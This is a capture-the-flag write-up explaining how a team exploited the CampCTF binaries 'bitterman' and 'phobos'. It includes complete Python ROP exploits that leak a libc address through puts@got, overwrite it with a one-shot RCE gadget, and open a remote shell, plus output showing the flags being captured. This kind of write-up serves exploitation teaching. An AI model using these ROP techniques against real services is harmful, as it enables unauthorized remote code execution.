### Solved by barrebas, Swappage, superkojiman

I rolled into the CampCTF while Swappage was already working on it. He had started on bitterman, a 400 point challenge. 

We're given a 64-bit ELF binary and Swappage also managed to obtain the corresponding libc. Upon starting the binary, we're presented with the following:

```bash
> What's your name? 
BBBB
Hi, BBBB
x
> Please input the length of your message: 
-1  
> Please enter your text: 
LSJFLSDJF
> Thanks!
```

The `x` after the `BBBB` in the above example was actually `0x7f`, so the binary is leaking part of an address (we later determined it to be a stack address). In the end, I couldn't make use of this, but it was interesting to see. Swappage already found the bugs: we can send a large message length and this will allow us to overflow a stack buffer. NX is enabled so it's ROP time!

Besides NX, ASLR is also enabled. This means we have to first leak a libc address to calculate libc's base address and then something like `system()`. I made use of the `puts@plt` to write out the contents of `puts@got`. The latter contains the libc address of `puts()`, which we can then receive. Superkojiman was able to find the one-shot RCE gadget. The ROP chain goes to `read@plt` and awaits our input. Upon receiving the address of the one-shot RCE gadget in libc, the ROP chain overwrites `puts@got` and restarts the binary from `main()`. This latter decision was based on using `system()` instead of the one-shot RCE gadget, but by the time I was done implementing the ROP chain, superkojiman had already supplied the offset. When `main()` restarts, one of the first functions it calls is `puts@plt`, which is now pointing to the shell-spawning one-shot RCE gadget. We land a shell and are happy!

```python
#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("<Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf
  
payload = "A"*152   # ty Swappage!

'''
0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
0x00000296 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
0x00000060 : pop rbp; ret
'''

base = 0x400590
# prologue, needed for later! after the [call r12 + rbx*8], there is
# a cmp rbx, rbp. At this point, rbx is 1 and if rbp is not equal to rbx, 
# the code jumps back instead of leading to a ret!
# therefore, we set up rbp first. 
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

# first, we set up some registers, which will later be put in the correct registers
# puts() uses rdi as argument
payload += q(0x000002bc+base)
payload += q(0x600c50)  # value for r12 -> puts@got
payload += q(0)         # value for r13 -> goes into rdx 
payload += q(0)         # value for r14 -> goes into rsi
payload += q(0x600c50)  # value for r15 -> goes into rdi -> leak addr of puts()

# swap around the registers and call puts()
payload += q(0x00000296+base)
payload += q(0) * 7
# without this, we don't get output
payload += q(0x400570)  # fflush@plt

# now read() to overwrite printf()
# read() is blocking and will wait for our input :)
# again, first set up rbp
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

# set up registers/arguments for read()
payload += q(0x000002bc+base)
payload += q(0x600c60)  # value for r12 -> read@got
payload += q(8)         # value for r13 -> goes into rdx -> count
payload += q(0x600c50)  # value for r14 -> goes into rsi -> overwrite puts@got
payload += q(0)         # value for r15 -> goes into rdi -> 0 -> stdin

payload += q(0x00000296+base)
payload += q(0) * 7

# restart main(), so the binary will execute puts() -> one shot rce, lands a shell
# could've just a easily return to puts@plt...
payload += q(0x4006ec) 

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10103))

    readtil('name?')
    s.send('a\n')
    readtil('message:')
    s.send('-1\n')   # ty Swappage!
    readtil('text:')
    s.send(payload+'\n')
    
    readtil('Thanks!\n')
    data = s.recv(8)
    data = data[:-1] + "\x00\x00"
    puts_addr = struct.unpack('<Q', data)[0]
    print "[+] Leaked puts(): " + hex(struct.unpack('<Q', data)[0])
    
    libc_base = puts_addr - 0x70a30
    print "[+] libc base addr: " + hex(libc_base)
    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"
    
    # the rop chain will wait at read(), because that is blocking
    # send the address to overwrite puts@got
    s.send(q(system_addr))
    
    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
pwn()
```
The reason for setting up `rbp`:

```
  400839:   call   QWORD PTR [r12+rbx*8]
  40083d:   add    rbx,0x1
  400841:   cmp    rbx,rbp  ; if rbx != rbp, we jump back!
  400844:   jne    400830 
  400846:   add    rsp,0x8  ; we wanna go here!
  40084a:   pop    rbx
  40084b:   pop    rbp
  40084c:   pop    r12
  40084e:   pop    r13
  400850:   pop    r14
  400852:   pop    r15
  400854:   ret    
```

And the exploit in action:

```bash
[+] Leaked puts(): 0x7fb9d6487a30
[+] libc base addr: 0x7fb9d6417000
[+] sending one shot rce addr (0x7fb9d645b2aa)
id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
whoami
challenge
ls -alh
total 40K
drwxr-xr-x 2 root root 4.0K Aug 13 13:46 .
drwxr-xr-x 3 root root 4.0K Aug  5 21:43 ..
-rw-r--r-- 1 root root  220 Aug  5 19:55 .bash_logout
-rw-r--r-- 1 root root 3.7K Aug  5 19:55 .bashrc
-rw-r--r-- 1 root root  675 Aug  5 19:55 .profile
-rwxr-xr-x 1 root root  11K Aug 12 01:28 bitterman
-rw-r--r-- 1 root root   43 Aug 13 13:47 flag.txt
-rwxr-xr-x 1 root root   64 Aug 12 01:34 run.sh
cat flag.txt
CAMP15_a786be6aca70bfd19b6af86133991f80  -
```

Phobos
---

Next, we turned to phobos for 300 points, which is nearly the same binary but without NX! After a few small changes to the previous exploit, we obtained the flag for phobos as well:


```python
#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("<Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf
  
payload = "A"*136   # ty Swappage!

'''
0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
0x000002b6 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
0x00000060 : pop rbp; ret
'''

base = 0x400590
# prologue, needed for later!
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

payload += q(0x000002dc+base)
payload += q(0x600c70)  # value for r12 -> puts@got
payload += q(0)         # value for r13 -> goes into rdx 
payload += q(0)         # value for r14 -> goes into rsi
payload += q(0x600c70)  # value for r15 -> goes into rdi -> leak addr of puts()

payload += q(0x000002b6+base)
payload += q(0) * 7
payload += q(0x400570)  # fflush@plt

# now read() to overwrite printf()
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

payload += q(0x000002dc+base)
payload += q(0x600c80)  # value for r12 -> read@got
payload += q(8)         # value for r13 -> goes into rdx -> count
payload += q(0x600c70)  # value for r14 -> goes into rsi -> overwrite printf()
payload += q(0)         # value for r15 -> goes into rdi -> 0 -> stdin

payload += q(0x000002b6+base)
payload += q(0) * 7

payload += q(0x4006ec) # restart, so the binary will execute puts() -> one shot rce, lands a shell

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10106))
    #s.connect(('localhost', 4444))

    print readtil('name?')
    s.send('a\n')
    print readtil('message:')
    s.send('-1\n')   # ty Swappage!
    print readtil('text:')
    s.send(payload+'\n')
    print readtil('Thanks!\n')
    
    data = s.recv(8)
    data = data[:-1] + "\x00\x00"
    
    puts_addr = struct.unpack('<Q', data)[0]
    print "[+] Leaked puts(): " + hex(struct.unpack('<Q', data)[0])
    libc_base = puts_addr - 0x70a30
    print "[+] libc base addr: " + hex(libc_base)
    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"
    
    s.send(q(system_addr))
    
    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
pwn()
```

And in action:

```bash
bas@tritonal:~/bin/ccc/phobos$ python poc2.py 
> What's your name?
 
Hi, a
<randomjunk>
> Please input the length of your message:
 
> Please enter your text:
 
> Thanks!

[+] Leaked puts(): 0x7fa6830dda30
[+] libc base addr: 0x7fa68306d000
[+] sending one shot rce addr (0x7fa6830b12aa)
id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
cat flag.txt
CAMP15_0ae754f04a8782cba9a7ec2c69dc1274
```

It's quite nice to solve a 400 point challenge only to find out we can use nearly the same solution for an additional 300 points!

